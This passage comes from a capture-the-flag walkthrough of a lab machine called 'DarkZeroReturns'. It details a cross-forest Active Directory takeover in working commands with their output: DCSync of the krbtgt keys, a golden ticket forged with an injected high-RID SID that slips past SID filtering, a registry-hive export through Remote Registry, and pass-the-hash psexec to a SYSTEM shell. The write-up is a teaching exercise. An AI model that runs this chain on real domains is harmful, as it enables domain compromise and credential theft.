**What this gives you:** The domain's ticket-signing key — complete and persistent control over authentication in `darkzero.ext`.

**Key findings:**

- **krbtgt NT hash: `8beaf5f950fefe79f608390a806d29a7`** (RID 502). This key signs every Kerberos ticket issued in the domain.
- **krbtgt AES256 key: `8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6`.** AES128 was also recovered. These matter — the forged ticket in 4.12 requires AES because the target DC rejects RC4.
- DCSync succeeded over the sshuttle tunnel using celia's cleartext password. Domain Admins membership implicitly grants `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`, which is what the DRSUAPI method requires.
- Possession of the krbtgt key permits forging **golden tickets** — Kerberos TGTs for arbitrary principals with arbitrary group memberships, valid until the krbtgt password is rotated twice.
- Sysmon for Linux was observed on SRV01 in 3.4, and DCSync is a heavily monitored operation on Windows DCs. In a real engagement this action would be conspicuous.

**Domain SID for `darkzero.ext`:** `S-1-5-21-2850783758-1231244658-2051857529`

**Custom group RIDs in `darkzero.ext`:**

|Group|RID|Notes|
|---|---|---|
|Forest Trust Accounts|528|Custom, RID below 1000|
|External Trust Accounts|529|Custom, RID below 1000|
|RepoManager|1106|Custom|
|GiteaAdmins|1107|Custom|
|RepoAudit|1111|Custom|
|ServiceHandler|1114|Confirmed independently in 4.5|

**Note on enumeration:** an initial group listing paired each name with the following group's SID, because a `paste - -` pipeline consumed the `# requesting:` header comment as its first field. Always verify a joined listing against an individual object query before trusting it.

**Next:** Enumerate `darkzero.htb` across the forest trust to identify a principal whose SID survives filtering and confers privilege on the target forest's domain controller.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div> ### 4.11 Enumerate the forest trust and identify the crossing principal

**Why this step:** A bidirectional forest trust with `darkzero.htb` was discovered. Identify the target forest's domain controller, its domain SID, and any privileged group whose SID could be injected into a forged ticket.

**Commands:**

Locate the target forest's DC via DNS SRV records — run on SRV01, whose resolver is the DC:

```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.darkzero.htb 172.16.20.2
getent hosts dc01.darkzero.htb
```

Retrieve the trust object, including the partner's domain SID:

```bash
KRB5CCNAME=/tmp/krb5cc_gitea LDAPSASL_NOCANON=on ldapsearch -Y GSSAPI -H ldap://DC02.darkzero.ext \
  -b "CN=System,DC=darkzero,DC=ext" "(objectClass=trustedDomain)" \
  dn cn flatName securityIdentifier msDS-TrustForestTrustInfo 2>/dev/null | grep -vE '^#|^$|^ref:|^search:|^result:'
```

Authenticate as celia and enumerate privileged groups across the trust:

```bash
KRB5CCNAME=/tmp/krb5cc_celia kinit celia@DARKZERO.EXT

KRB5CCNAME=/tmp/krb5cc_celia LDAPSASL_NOCANON=on ldapsearch -Y GSSAPI \
  -H ldap://dc01.darkzero.htb -b "DC=darkzero,DC=htb" \
  "(|(cn=Backup Operators)(cn=Administrators)(cn=Domain Admins)(cn=Server Operators))" \
  dn member 2>/dev/null | grep -vE '^#|^$|^ref:|^search:|^result:'
```

Retrieve the crossing group's SID:

```bash
KRB5CCNAME=/tmp/krb5cc_celia LDAPSASL_NOCANON=on ldapsearch -Y GSSAPI \
  -H ldap://dc01.darkzero.htb -b "DC=darkzero,DC=htb" \
  "(cn=InfrastructureAdministrators)" dn objectSid member memberOf 2>/dev/null | grep -vE '^#|^$|^ref:|^search:|^result:'
```

Decode the SID from base64:

```bash
python3 -c "
import base64,struct
d=base64.b64decode('AQUAAAAAAAUVAAAAEjbOrO8/Lm7DEkFcQwYAAA==')
n=d[1]; auth=int.from_bytes(d[2:8],'big')
subs=struct.unpack('<%dI'%n, d[8:8+4*n])
print('S-%d-%d-'%(d[0],auth)+'-'.join(map(str,subs)))
"
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>`|Query the SRV record advertising domain controllers|Ask DNS which servers run the domain|
|`securityIdentifier`|The trusted domain's SID, held on the trust object|The other forest's unique ID|
|`msDS-TrustForestTrustInfo`|Encoded record of the trusted forest's namespaces and SIDs|Which names and SIDs the trust covers|
|`objectSid`|The group's SID, base64-encoded binary|The value that appears in a ticket's PAC|
|`struct.unpack('<%dI'%n, ...)`|Decode little-endian 32-bit sub-authorities|Convert the binary SID to readable form|

The DNS query must run on SRV01 rather than the attacking host: SRV01's resolver is the domain controller, whereas the attacking host queries a public resolver that has never heard of `darkzero.htb`.

**Result — DNS:**

```
_ldap._tcp.dc._msdcs.darkzero.htb  service = 0 100 389 dc01.darkzero.htb.
dc01.darkzero.htb  internet address = 172.16.20.1
dc01.darkzero.htb  internet address = 10.129.54.208
```

**Result — trust object:**

```
dn: CN=darkzero.htb,CN=System,DC=darkzero,DC=ext
cn: darkzero.htb
flatName: darkzero
securityIdentifier:: AQQAAAAAAAUVAAAAEjbOrO8/Lm7DEkFc
```

**Result — privileged groups in `darkzero.htb`:**

```
dn: CN=Domain Admins,CN=Users,DC=darkzero,DC=htb
member: CN=Administrator,CN=Users,DC=darkzero,DC=htb

dn: CN=Administrators,CN=Builtin,DC=darkzero,DC=htb
member: CN=Domain Admins,CN=Users,DC=darkzero,DC=htb
member: CN=Enterprise Admins,CN=Users,DC=darkzero,DC=htb
member: CN=Administrator,CN=Users,DC=darkzero,DC=htb

dn: CN=Backup Operators,CN=Builtin,DC=darkzero,DC=htb
member: CN=InfrastructureAdministrators,CN=Users,DC=darkzero,DC=htb

dn: CN=Server Operators,CN=Builtin,DC=darkzero,DC=htb
```

**Result — crossing group:**

```
dn: CN=InfrastructureAdministrators,CN=Users,DC=darkzero,DC=htb
memberOf: CN=Backup Operators,CN=Builtin,DC=darkzero,DC=htb
objectSid:: AQUAAAAAAAUVAAAAEjbOrO8/Lm7DEkFcQwYAAA==
```

```
S-1-5-21-2899195410-1848524783-1547768515-1603
```

**What this gives you:** The complete parameter set for a cross-forest golden ticket.

**Forest topology:**

|Property|Value|
|---|---|
|Source forest|`darkzero.ext` (compromised)|
|Source domain SID|`S-1-5-21-2850783758-1231244658-2051857529`|
|Source DC|`DC02.darkzero.ext` — `172.16.20.2`|
|krbtgt NT hash (source)|`8beaf5f950fefe79f608390a806d29a7`|
|krbtgt AES256 key (source)|`8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6`|
|Target forest|`darkzero.htb`|
|Target domain SID|`S-1-5-21-2899195410-1848524783-1547768515`|
|Target DC|`DC01.darkzero.htb` — `172.16.20.1`|
|Trust direction|Bidirectional (`trustDirection: 3`)|
|Trust type|Forest transitive (`trustAttributes: 8`)|
|Crossing group|`InfrastructureAdministrators` — RID **1603**|

**Key findings:**

- **`DC01.darkzero.htb` is the target forest's domain controller at `172.16.20.1`** — the address that has been SRV01's default gateway throughout. It is also `10.129.54.208`, the machine's external address, meaning the DC has been the externally-facing host from the outset.
- **`darkzero.htb` domain SID: `S-1-5-21-2899195410-1848524783-1547768515`**, decoded from the trust object's `securityIdentifier`. This is required to construct the injected SID.
- **`InfrastructureAdministrators` is a member of `Backup Operators` in `darkzero.htb`**, with SID RID **1603**. Backup Operators confers `SeBackupPrivilege` on domain controllers — the right to read any file on the system regardless of ACL, including `ntds.dit`.
- **The group has no members.** It exists solely as a privileged SID with nothing legitimately holding it, which is exactly what makes it available for injection.
- Cross-forest LDAP authentication succeeded using celia's Kerberos ticket, confirming the bidirectional trust permits authenticated queries in both directions.
- **The group resides in `darkzero.htb`, the target forest — not in `darkzero.ext`.** An earlier enumeration of `darkzero.ext` groups did not list it, which briefly suggested the group did not exist on this instance. Reference material describes it as belonging to the source forest; on this instance it belongs to the target. Its RID (1603) matches reference material exactly.
- **Dead end:** `CN=ForeignSecurityPrincipals` in `darkzero.htb` contains only well-known SIDs (S-1-5-4, S-1-5-9, S-1-5-11, S-1-5-17). No `darkzero.ext` principal has been granted membership in a `darkzero.htb` group by SID, so no direct cross-forest group membership exists to abuse.

<div align="center"> <br> <br> </div>

##### Forest trusts, SID filtering, and why RID 1603 survives

A forest trust lets principals in one Active Directory forest authenticate to resources in another. When a user crosses the boundary, their Kerberos ticket carries a **PAC** (Privilege Attribute Certificate) listing their SID and every group SID they hold. The target forest reads that list to make authorisation decisions.

The obvious attack is to add SIDs to the PAC. Compromise a forest's krbtgt key and you can forge a ticket asserting any group membership you like — including groups belonging to the _other_ forest. This is the golden ticket with extra SIDs.

**SID filtering** is the defence. When a ticket crosses a trust boundary, the receiving DC strips SIDs that do not belong to the source domain, on the principle that a foreign forest has no business asserting membership in local groups.

The subtlety, and it is the whole point of this box, is _which_ SIDs get stripped. Under the "Treat as External" / quarantine configuration, the filter removes SIDs whose RID is **below 1000** — the well-known built-in groups such as Administrators (544), Backup Operators (551), and Domain Admins (512). These are the SIDs an attacker would most obviously want to inject, so they are filtered.

SIDs with RID **≥ 1000** are _not_ filtered. Those identify domain-created principals, and the filter permits them on the assumption that a foreign forest asserting a locally-created SID is a legitimate cross-forest group membership.

That assumption is what breaks here. `InfrastructureAdministrators` has RID **1603** — above the threshold — and it is a member of `Backup Operators`, which has RID 551 and _would_ be filtered if injected directly. Injecting 1603 instead of 551 slips past the filter, and the target DC then resolves group membership locally: the ticket holds 1603, 1603 is a member of Backup Operators, therefore the holder is a Backup Operator.

The nesting is what defeats the filter. The filter inspects the SIDs present in the ticket, not the transitive privileges those SIDs confer. A custom group nested inside a privileged built-in launders the built-in's privilege through a SID the filter permits.

This inverts most administrators' intuition. The natural assumption is that low RIDs are the sensitive ones and high RIDs are ordinary user-created objects — so filtering the low ones sounds protective. In practice the filter blocks the SIDs that are useless to inject and permits the ones that work.

**Next:** Forge a golden ticket in `darkzero.ext` carrying the `InfrastructureAdministrators` SID as an extra SID.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 4.12 Forge a cross-forest golden ticket with an injected SID

**Why this step:** The krbtgt key for `darkzero.ext` is held, and `InfrastructureAdministrators` (RID 1603) in `darkzero.htb` is a member of Backup Operators. Forge a TGT asserting that group membership as an extra SID, exploiting SID filtering's RID ≥ 1000 exemption.

**Command:**

```bash
impacket-ticketer -aesKey 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6 \
  -domain darkzero.ext \
  -domain-sid S-1-5-21-2850783758-1231244658-2051857529 \
  -extra-sid S-1-5-21-2899195410-1848524783-1547768515-1603 \
  administrator

export KRB5CCNAME=$(pwd)/administrator.ccache
klist
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`impacket-ticketer`|Forge a Kerberos TGT offline|Build a ticket without asking the KDC|
|`-aesKey <krbtgt AES256>`|Sign with the krbtgt AES key|**Required** — `-nthash` produces RC4, which the DC rejects|
|`-domain darkzero.ext`|Realm the ticket claims to come from|The compromised forest|
|`-domain-sid`|Source domain SID|Identifies the issuing domain|
|`-extra-sid <target SID>-1603`|Inject `InfrastructureAdministrators` into the PAC|Claim membership in the _other_ forest's group|
|`administrator`|Principal name asserted|Need not exist — we hold the signing key|

**Result:**

```
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for darkzero.ext/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*] Saving ticket in administrator.ccache
```

```
Ticket cache: FILE:administrator.ccache
Default principal: administrator@DARKZERO.EXT

Valid starting       Expires              Service principal
07/29/2026 11:16:11  07/26/2036 11:16:11  krbtgt/DARKZERO.EXT@DARKZERO.EXT
```

**What this gives you:** A Kerberos TGT asserting a privileged group membership in the target forest.

**Key findings:**

- Golden ticket forged for `administrator@DARKZERO.EXT` carrying the target forest's `InfrastructureAdministrators` SID in its PAC.
- **The AES256 key is mandatory.** An initial attempt using `-nthash` produced an RC4-encrypted ticket and DC01 rejected it with `KDC_ERR_ETYPE_NOSUPP` — modern Windows disables RC4 for cross-realm referrals. Dumping AES keys alongside NT hashes during DCSync is therefore not optional.
- The ten-year validity is impacket's default and is a reliable forensic indicator of a forged rather than KDC-issued ticket.
- RID 1603 exceeds the 1000 threshold, so SID filtering permits it across the trust boundary. Injecting Backup Operators (RID 551) directly would have been stripped.

**Next:** Prepare Kerberos client configuration on the attacking host and authenticate to DC01.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 4.13 Configure the attacking host for cross-realm authentication

**Why this step:** The forged ticket must be presented to DC01 in the target forest. The attacking host requires network reachability, name resolution for both realms, KDC locations, and clock synchronisation within Kerberos' five-minute tolerance.

**Commands:**

Route the internal subnet through the foothold — leave running in a dedicated terminal:

```bash
sshuttle -r josh@TARGET_IP 172.16.20.0/24
```

Add name resolution for both domains and both DCs:

```bash
echo "172.16.20.2 DC02.darkzero.ext darkzero.ext DARKZERO.EXT" | sudo tee -a /etc/hosts
echo "172.16.20.1 DC01.darkzero.htb dc01 DARKZERO.HTB darkzero.htb" | sudo tee -a /etc/hosts
```

Write a Kerberos client configuration naming both realms:

```bash
sudo tee /etc/krb5.conf > /dev/null << 'EOF'
[libdefaults]
    default_realm = DARKZERO.EXT
    dns_lookup_realm = false
    dns_lookup_kdc = false
    rdns = false

[realms]
    DARKZERO.EXT = {
        kdc = 172.16.20.2
        admin_server = 172.16.20.2
    }
    DARKZERO.HTB = {
        kdc = 172.16.20.1
        admin_server = 172.16.20.1
    }

[domain_realm]
    .darkzero.ext = DARKZERO.EXT
    darkzero.ext = DARKZERO.EXT
    .darkzero.htb = DARKZERO.HTB
    darkzero.htb = DARKZERO.HTB
EOF
```

Determine the clock offset by comparing the domain-synced host against the attacking host:

```bash
# On SRV01
date -u
# On Kali
date -u
```

Install `faketime` and apply the offset per-command rather than changing the system clock:

```bash
sudo apt install -y faketime
faketime "$(date -u -d '+7 hours' '+%Y-%m-%d %H:%M:%S')" <command>
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`sshuttle -r <host> <subnet>`|Transparent TCP routing over SSH|Makes the internal network reachable from Kali|
|`[realms]` with both KDCs|Tells the client where each realm's KDC lives|Which server to ask for tickets in each domain|
|`[domain_realm]`|Maps DNS names to Kerberos realms|Which realm a given hostname belongs to|
|`rdns = false`|Disable reverse-DNS SPN canonicalisation|Same fix as `SASL_NOCANON`, for MIT Kerberos|
|`faketime "<timestamp>" <cmd>`|Run a command with a shifted clock|Fixes skew without touching the system time|

**Result:**

```
SRV01: Wed Jul 29 06:30:13 PM UTC 2026
Kali:  Wed Jul 29 11:30:19 AM UTC 2026
```

Offset: **+7 hours**.

**What this gives you:** A client environment capable of presenting the forged ticket to the target forest.

**Key findings:**

- Four distinct failures had to be resolved in sequence before authentication succeeded, each producing a misleading error:

|Error|Actual cause|Fix|
|---|---|---|
|`Errno Connection error (DARKZERO.EXT:88)`|Realm name unresolvable|`/etc/hosts` entry|
|`KDC_ERR_ETYPE_NOSUPP`|RC4 ticket rejected|Reforge with `-aesKey`|
|`KRB_AP_ERR_SKEW`|7-hour clock difference|`faketime` wrapper|
|`Errno Connection error (DARKZERO.HTB:88)`|Referral target unresolvable|Second `/etc/hosts` entry|

- **Dead end:** NTP synchronisation is impossible through sshuttle, which tunnels TCP only. `ntpdate` and `rdate -n` both use UDP and fail with `no eligible servers`. Reading the clock from the domain-joined foothold and applying a manual offset is the workable approach.
- `faketime` in this build requires an absolute timestamp; relative offsets such as `+7h` are rejected. Generate the timestamp with `date -u -d '+7 hours'`.
- The offset expression must be recomputed for each command. A stale value drifts out of the five-minute window and reproduces `KRB_AP_ERR_SKEW`.

**Next:** Authenticate to DC01 with the forged ticket and establish the extent of the granted access.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div> 

### 4.14 Authenticate to DC01 and enumerate accessible shares

**Why this step:** The forged ticket asserts membership in a group nested inside Backup Operators on DC01. Establish an SMB session across the trust to confirm the SID survived filtering and determine what access it confers.

**Command:**

```bash
FT="$(date -u -d '+7 hours' '+%Y-%m-%d %H:%M:%S')"
faketime "$FT" impacket-smbclient -k -no-pass DC01.darkzero.htb
```

At the prompt:

```
shares
use C$
ls
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`-k`|Use Kerberos from the ccache|Authenticate with the forged ticket|
|`-no-pass`|Supply no password|The ticket is the credential|
|`shares`|List available SMB shares|What can I connect to|
|`use C$`|Connect to the administrative disk share|Open the system drive|

**Result:**

```
# shares
ADMIN$
C$
IPC$
NETLOGON
SYSVOL

# use C$
# ls
drw-rw-rw-  0  $RECYCLE.BIN
drw-rw-rw-  0  Program Files
drw-rw-rw-  0  ProgramData
drw-rw-rw-  0  Sysmon
drw-rw-rw-  0  Users
drw-rw-rw-  0  Windows
drw-rw-rw-  0  Windows.old
```

Access to subdirectories and files is denied:

```
# cd Users\Administrator
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED
# get SYSTEM
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED
```

**What this gives you:** Confirmation that the cross-forest SID injection worked, and a precise boundary on what the resulting privilege permits.

**Key findings:**

- **The cross-forest attack succeeded.** DC01 accepted the forged ticket and granted access to administrative shares (`ADMIN$`, `C$`) — access no ordinary domain user of `darkzero.ext` would receive. The injected RID 1603 crossed the trust boundary and resolved locally to Backup Operators membership.
- **`SeBackupPrivilege` does not apply to ordinary file reads.** Directory listings succeed, but opening any file or descending into an ACL-protected directory returns `STATUS_ACCESS_DENIED`. The privilege engages only when a file is opened with the `FILE_FLAG_BACKUP_SEMANTICS` flag, which impacket's smbclient does not set.
- **Dead end:** `C:\Users\Administrator\Desktop\root.txt` cannot be read directly. Nor can `C:\Windows\System32\config\{SAM,SYSTEM,SECURITY}`, nor their `RegBack` copies, despite all being listable.
- **Dead end:** DRSUAPI-based DCSync against DC01 with this ticket fails — `Policy SPN target name validation might be restricting full DRSUAPI dump`, then `ERROR_DS_DRA_BAD_DN`. Backup Operators grants file-read rights, not directory replication rights.

<div align="center"> <br> <br> </div>

##### Why listing works but reading does not

`SeBackupPrivilege` exists so that backup software can copy files its operator has no permission to read. Crucially, it is not applied automatically. Windows checks the privilege only when a file handle is requested with `FILE_FLAG_BACKUP_SEMANTICS` set — an explicit signal meaning "I am performing a backup; bypass the DACL."

A generic SMB client issues ordinary `CreateFile` requests without that flag, so the ACL is enforced normally and access is denied. Directory _enumeration_ is a different operation governed by different permissions, which is why `ls` succeeds against paths whose contents cannot be opened.

The consequence is that Backup Operators cannot be exploited with a plain file-copy tool. It must be exercised through something that invokes the privilege server-side. The Remote Registry service does exactly this: `reg save` runs on the DC, opens the hive with backup semantics, and writes a copy to a destination path — and that copy is a new file inheriting the destination directory's ACL rather than the hive's.

**Next:** Export the registry hives server-side via Remote Registry to a location readable over SMB.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 4.15 Export registry hives via Remote Registry and retrieve them

**Why this step:** The registry hives cannot be read directly over SMB. Remote Registry's backup function runs server-side with `SeBackupPrivilege` applied, producing copies whose permissions derive from the destination directory.

**Commands:**

```bash
FT="$(date -u -d '+7 hours' '+%Y-%m-%d %H:%M:%S')"
faketime "$FT" impacket-reg -k -no-pass DC01.darkzero.htb backup \
  -o 'C:\Windows\SYSVOL\sysvol\darkzero.htb\scripts'
```

```bash
faketime "$(date -u -d '+7 hours' '+%Y-%m-%d %H:%M:%S')" impacket-smbclient -k -no-pass DC01.darkzero.htb
```

At the prompt:

```
use NETLOGON
ls
get SYSTEM.save
get SECURITY.save
```

Then locally:

```bash
impacket-secretsdump -system SYSTEM.save -security SECURITY.save LOCAL
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`impacket-reg ... backup`|Invoke `reg save` over the Remote Registry service|Ask the DC to copy its own registry hives|
|`-o '<path>'`|Server-side destination for the copies|Where the DC writes them|
|`C:\Windows\SYSVOL\sysvol\<domain>\scripts`|The NETLOGON share's backing directory|A world-readable path exposed as its own SMB share|
|`use NETLOGON`|Connect to the logon-scripts share|Reach the files without traversing `C$`|
|`secretsdump ... LOCAL`|Parse hives offline|Extract secrets from the downloaded files|

**Result:**

```
[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to C:\Windows\SYSVOL\sysvol\darkzero.htb\scripts\SAM.save
[*] Saved HKLM\SYSTEM to C:\Windows\SYSVOL\sysvol\darkzero.htb\scripts\SYSTEM.save
[*] Saved HKLM\SECURITY to C:\Windows\SYSVOL\sysvol\darkzero.htb\scripts\SECURITY.save
```

```
# use NETLOGON
# ls
-rw-rw-rw-     28672  SAM.save
-rw-rw-rw-     36864  SECURITY.save
-rw-rw-rw-  16883712  SYSTEM.save
```

```
[*] Target system bootKey: 0xd7104de0ccfc39117fa0498a3dfbd8a3
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:686d06e419d66abfa5fefac2618cdcea
[*] DPAPI_SYSTEM
dpapi_machinekey:0x22c0c905bd49a8e038bfd5b8a30b1b96a52cb087
dpapi_userkey:0x33aef7188b336e1e7e32e49e6a02707b99214d31
[*] NL$KM
NL$KM:fa36c7d5c082abb578e117f05e36135ba59fc09c38a8c434fe20f72bd9a28caf...
[*] Cleaning up...
```

**What this gives you:** DC01's own machine account credential — the key to a working DCSync against the target forest.

**Key findings:**

- **DC01's machine account hash recovered: `686d06e419d66abfa5fefac2618cdcea`.** A domain controller's computer account inherently holds `DS-Replication-Get-Changes-All`, so this credential permits the DCSync that the forged ticket could not perform.
- **The destination path determines whether the exported hives are retrievable.** Copies written to `C:\Windows\Temp` and `C:\Users\Public` were created successfully but could not be downloaded — this principal is denied directory traversal into both. Writing into the SYSVOL scripts directory places the files under the NETLOGON share, which is world-readable by design and requires no traversal of `C$`.
- The Remote Registry service was not running and impacket started it via named pipe automatically.
- `SYSTEM` provides the boot key that decrypts LSA secrets; `SECURITY` holds the encrypted secrets themselves. Both are required. `SAM` is unnecessary on a domain controller, which stores no meaningful local accounts.
- DPAPI machine keys and the `NL$KM` cached-credential key were also recovered, enabling decryption of DPAPI-protected secrets and any cached domain logons.
- The `$FT` timestamp variable expires. A stale value between commands reproduces `KRB_AP_ERR_SKEW`; recompute it inline for each invocation.
- `SYSTEM.save` is roughly 16 MB and transfers over SMB inside an SSH tunnel. Allow several minutes, and verify the local file size before parsing — a truncated hive will not decode.

**Next:** DCSync `darkzero.htb` using the machine account credential.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 4.16 DCSync `darkzero.htb` and capture the root flag

**Why this step:** The DC01 machine account holds directory replication rights by virtue of being a domain controller. Use it to replicate the Administrator credential, then authenticate with that hash to read the flag.

**Commands:**

```bash
faketime "$(date -u -d '+7 hours' '+%Y-%m-%d %H:%M:%S')" impacket-secretsdump \
  'darkzero.htb/DC01$@172.16.20.1' \
  -hashes 'aad3b435b51404eeaad3b435b51404ee:686d06e419d66abfa5fefac2618cdcea' \
  -just-dc-user Administrator
```

```bash
faketime "$(date -u -d '+7 hours' '+%Y-%m-%d %H:%M:%S')" impacket-psexec \
  'darkzero.htb/Administrator@172.16.20.1' \
  -hashes 'aad3b435b51404eeaad3b435b51404ee:4d470bb7497acf3f5f5c2a11872e02ac'
```

At the resulting shell:

```
type C:\Users\Administrator\Desktop\root.txt
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`'darkzero.htb/DC01$@172.16.20.1'`|Authenticate as the DC's machine account — single-quoted|The `$` must be quoted or bash consumes it|
|`-hashes 'LM:NT'`|Pass-the-hash authentication|Use the hash directly; no password needed|
|`-just-dc-user Administrator`|Replicate one account only|Fetch just the account that matters|
|`impacket-psexec`|Remote command execution via service creation|Get a shell on the target|

**Result:**

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4d470bb7497acf3f5f5c2a11872e02ac:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:392e85853234728df1ca77a4b52cd64c0f8451df619187f93851afa0460e4a48
Administrator:aes128-cts-hmac-sha1-96:e1c75c9524d2cc067ca39122b624b040
[*] Cleaning up...
```

```
[*] Requesting shares on 172.16.20.1.....
[*] Found writable share ADMIN$
[*] Uploading file nczgcKXz.exe
[*] Opening SVCManager on 172.16.20.1.....
[*] Creating service ePzu on 172.16.20.1.....
[*] Starting service ePzu.....
Microsoft Windows [Version 10.0.26100.33158]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\System32> type C:\Users\Administrator\Desktop\root.txt
c19fe6604d0912d2a349a1cecc8e8635
```

**ROOT FLAG: `c19fe6604d0912d2a349a1cecc8e8635`**

**What this gives you:** Domain Administrator in `darkzero.htb` and a SYSTEM shell on its domain controller.

**Key findings:**

- **Administrator NT hash for `darkzero.htb`: `4d470bb7497acf3f5f5c2a11872e02ac`.** Full domain administrator in the target forest.
- DCSync succeeded where the forged ticket failed. The machine account's replication rights are intrinsic to its role; Backup Operators membership never conferred them.
- `impacket-psexec` uploads a service binary to `ADMIN$` and creates a Windows service to execute it, yielding a SYSTEM shell. It is effective but noisy — the uploaded binary and created service are both logged, and Sysmon is deployed in this environment.
- The complete forest pivot required four distinct credentials in sequence: krbtgt (ticket forgery) → forged TGT (SMB access) → DC01$ (replication) → Administrator (execution).

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※ <br> </div> <!-- PAGE BREAK --> <div style="page-break-after: always;"></div>

## 5. Conclusion

Both flags captured on `DarkZeroReturns`.

**USER FLAG:** `df16ad3e79881c515d6d6245b4293d92`

**ROOT FLAG:** `c19fe6604d0912d2a349a1cecc8e8635`

Flag values rotate per machine instance; the values above correspond to the instance on which each was captured.

### 5.1 Attack chain summary

```
1. Handlebars AST injection (CVE-2026-33937)
   campaign_message submitted as a JSON object bypasses the parser
   → RCE as darkzero on SRV01 (Linux)

2. Credential harvesting
   .env → MySQL → bcrypt hashes → josh:Rangers1
   → SSH as josh, inheriting a Kerberos TGT for darkzero.ext

3. Gitea via SPNEGO
   Kerberos service ticket for HTTP/gitea.darkzero.ext
   → authenticated session with no password

4. Gitea Actions fork approval bypass (CVE-2026-22555)
   Fork → pull_request_review_comment workflow → PR → review comment
   → execution as svc-runner → SSH key persistence → user.txt

5. svc-runner → root on SRV01
   Readable keytab from systemd unit → LDAP as svc-runner
   → CREATE_CHILD on GiteaMigration OU → create domain user "root"
   → ksu root@DARKZERO.EXT → uid 0

6. Domain Admin in darkzero.ext
   SQL backup in /root → deleted row → celia:babygurl13
   → DCSync → krbtgt key

7. Forest pivot → darkzero.htb
   Golden ticket + InfrastructureAdministrators SID (RID 1603)
   → survives SID filtering → Backup Operators on DC01
   → Remote Registry hive export → DC01$ hash
   → DCSync darkzero.htb → Administrator → root.txt
```

### 5.2 What each phase actually turned on

**The web application handed over the template instead of the values.** A field asked users to write the arrival message, and that message was compiled by Handlebars. Sending it as a JSON object rather than a string skipped the parser entirely, letting a `NumberLiteral` node carry JavaScript straight into the compiled function.

**Every credential was stored somewhere readable by whoever needed it.** The `.env` file held the database password because the application needs it at startup. The database held bcrypt hashes because it stores users. The runner's systemd unit named its keytab path because systemd needs it. Root's home held a SQL backup because someone made one. No step required a novel exploit; each required being the right user at the right time.

**Two identity systems disagreed about the word "root".** Active Directory saw an ordinary user object. Linux's `ksu` saw a principal whose name matched uid 0, and with no `.k5login` to restrict it, authorised the switch. The right to create one user object in one OU became root on the host.

**A CI runner executed a workflow it should have held for approval.** Gitea's `pull_request_review_comment` notifier omits PR context, so a fork-originated run was classified as trusted. Read access to a private repository became code execution as the runner account.

**The SID filter blocked the wrong SIDs.** "Treat as External" strips RIDs below 1000 — the built-in groups everyone expects to be sensitive. It permits RIDs above 1000. `InfrastructureAdministrators` sits at 1603 and is nested inside Backup Operators, so injecting the high RID laundered the low one's privilege across a forest boundary.

### 5.3 Category assessment

The box is labelled Windows and its final objective is a Windows domain controller, but the practical skill distribution is not what that label suggests.

Roughly the first third is **web application testing** — server-side template injection, content-type manipulation, CSRF handling — conducted entirely against a Linux host.

The middle third is **CI/CD and supply-chain security**, a distinct discipline from both web testing and Active Directory. The Gitea Actions abuse requires understanding how build systems trust repository content and where approval gates sit.

The final third is **Active Directory**, and within that, a large share of the effort was operational rather than conceptual: Kerberos encryption type negotiation, clock skew, SPN canonicalisation, and name resolution across two realms. The attack itself — inject a high-RID SID across a forest trust — is a handful of commands. Getting a client configured to deliver it took considerably longer.

### 5.4 Suggested self-directed exploration

Solve the `SeBackupPrivilege` dead end properly. This walkthrough routed around it using Remote Registry, which works but sidesteps the underlying question. The direct approach requires a client that opens files with `FILE_FLAG_BACKUP_SEMANTICS` — investigate `robocopy /b`, forks of `smbclient.py` supporting backup intent, or write a minimal Python SMB client that sets the flag itself.

Understanding why one tool succeeds where another fails against identical permissions is the transferable lesson, and it generalises to every privilege that must be explicitly invoked rather than passively applied.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※ <br> </div> <!-- PAGE BREAK --> <div style="page-break-after: always;"></div> ## 6. Lessons Learned

### 6.1 Test for execution, not for reflection

`{{name}}` returning your name proves nothing — find-and-replace produces that result. `{{#if true}}yes{{/if}}` returning `yes` requires a parser, an interpreter, and a decision. Choose probes whose output can only be explained by evaluation.

